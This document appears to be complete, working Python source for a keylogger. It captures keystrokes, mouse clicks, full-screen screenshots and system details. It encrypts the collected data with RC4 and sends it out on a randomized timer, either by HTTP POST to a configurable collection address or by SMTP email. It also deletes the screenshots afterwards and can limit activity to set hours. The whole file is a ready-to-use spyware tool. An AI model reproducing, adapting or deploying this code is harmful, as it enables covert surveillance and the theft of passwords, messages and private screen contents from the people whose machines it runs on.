import os
import platform
import smtplib
import socket
import threading
import requests
import string
import random
import sys
import json
import time
from PIL import ImageGrab
from pynput import keyboard
from pynput import mouse
from datetime import datetime
from util import Mode, EncScheme, Encryption
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
 
# SETTINGS
MODE = Mode.NETWORK
DESTINATION_ADDR = 'http://127.0.0.1:8080/YW50'
SMTP_SERVER = 'smtp.example.com'
SMTP_USERNAME = 'example@example.com'  # receiver
SMTP_PASSWORD = 'example'
SEND_INTERVAL = 30  # in seconds
RANDOMIZE_INTERVAL = True  # between 1x to 2x of SEND_INTERVAL
RESTRICT_HOURS = False
START_HOUR = 8  # local time
END_HOUR = 17  # local time
IMAGE_LOGS = True
MOUSE_LOGS = False
ENC_SCHEME = EncScheme.RC4

class KeyLogger:
    def __init__(self):
        self.interval = SEND_INTERVAL
        self.session_id = self.create_session_id()
        self.log = ""
        self.appendlog(("=" * 40) + "\n")
        self.appendlog(f"SESSION STARTED (ID: {self.session_id}) @ {datetime.now()}\n")
        self.appendlog(self.get_system_information())
        self.appendlog(("=" * 40) + "\n")
        
    def create_session_id(self):
        # hostname = socket.gethostname()
        unique_val = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        session_id = f"{unique_val}_{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}"
        return session_id

    def appendlog(self, string):
        self.log = self.log + string

    def on_click(self, x, y, button, pressed):
        current_click = '{0} {1} at {2}'.format('Left-click' if button == button.left else ('Right-click' if button == button.right else 'Unknown'), 'pressed' if pressed else 'released', (x, y))
        if MOUSE_LOGS:
            self.appendlog("\n" + current_click + "\n")
        # print(current_click)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.enter:
                current_key = "\n"
            elif key == key.space:
                current_key = " "
            elif key == key.backspace:
                current_key = "[DEL]"
            elif key == key.shift:
                current_key = "[SHIFT]"
            elif key == key.tab:
                current_key = "[TAB]"
            elif key == key.esc:
                current_key = "[ESC]"
            elif key == key.ctrl_l or key == key.ctrl_r:
                current_key = "[CTRL]"
            elif key == key.up:
                current_key = "[UP]"
            elif key == key.down:
                current_key = "[DOWN]"
            elif key == key.left:
                current_key = "[LEFT]"
            elif key == key.right:
                current_key = "[RIGHT]"
            else:
                current_key = str(key)
        self.appendlog(current_key)

    def send_msg(self, log_data):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        header = f"{hostname} ({ip}) | {str(datetime.now())}"

        img_name, img_path = self.screenshot()
        img = open(img_path, 'rb') if img_path is not None else None
        img_data = img.read() if img is not None else None

        print(img_path)

        if MODE == Mode.NETWORK:
            data = {
                'session_id': self.session_id, 
                'hostname': hostname, 
                'header': header, 
                'log_data': log_data, 
                'img_name': img_name,
                'img': img_data.hex() if img is not None else None
            }
            data = json.dumps(data)
            data = data.encode()
            try:
                base_path = sys._MEIPASS
            except Exception:
                base_path = os.path.abspath(".")
            key_path = os.path.join(base_path, "key.txt")
            key = open(key_path, 'rb').read()
            cipher = Encryption(key, ENC_SCHEME)
            encrypted_data = cipher.encrypt(data)
            print(f"Sending to {DESTINATION_ADDR}... (Network mode)")
            try:
                response = requests.post(DESTINATION_ADDR, data={'data': encrypted_data})
                print(response)
                print(response.text)
            except Exception:
                print("Failed POST request; continuing")
            print("Sent.")

        elif MODE == Mode.EMAIL:
            print(f"Sending to {SMTP_SERVER}... (Email mode)")
            sender = "pylogger@xdd.com"
            email = MIMEMultipart()
            email['Subject'] = header
            email['Sender'] = sender
            email['Receiver'] = SMTP_USERNAME
            email.attach(MIMEText(log_data))
            image = MIMEApplication(img_data, Name=os.path.basename(img_path))
            image['Content-Disposition'] = f'attachment; filename="{img_name}"'
            email.attach(image)
            with smtplib.SMTP_SSL(SMTP_SERVER, 465) as server:
                server.login(SMTP_USERNAME, SMTP_PASSWORD)
                server.sendmail(sender, SMTP_USERNAME, email.as_string())

        if IMAGE_LOGS:
            img.close()
            os.remove(img_path)

    def report(self):
        current_hour = datetime.now().hour
        if RESTRICT_HOURS:
            if START_HOUR <= current_hour < END_HOUR:
                self.send_msg(self.log)
                self.log = ""
        else:
            self.send_msg(self.log)
            self.log = ""

        if RANDOMIZE_INTERVAL:
            self.interval = random.randint(SEND_INTERVAL, SEND_INTERVAL * 2)
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def get_system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        return_val = f"{hostname}\n{ip}\n{plat}\n{system}\n{machine}\n"
        return return_val

    def screenshot(self):
        if IMAGE_LOGS:
            img = ImageGrab.grab(all_screens=True)
            img_name = f"{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.png"
            img_path = f"{os.path.expanduser("~")}\\AppData\\Local\\Temp\\{img_name}"
            img.save(img_path)
            return img_name, img_path
        else:
            return None, None

    def run(self):
        self.report()
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        keyboard_listener.start()
        mouse_listener = mouse.Listener(on_click=self.on_click)
        mouse_listener.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("KeyboardInterrupt detected; Exiting program.")

if __name__ == "__main__":
    print("Initializing...")
    keylogger = KeyLogger()
    keylogger.run()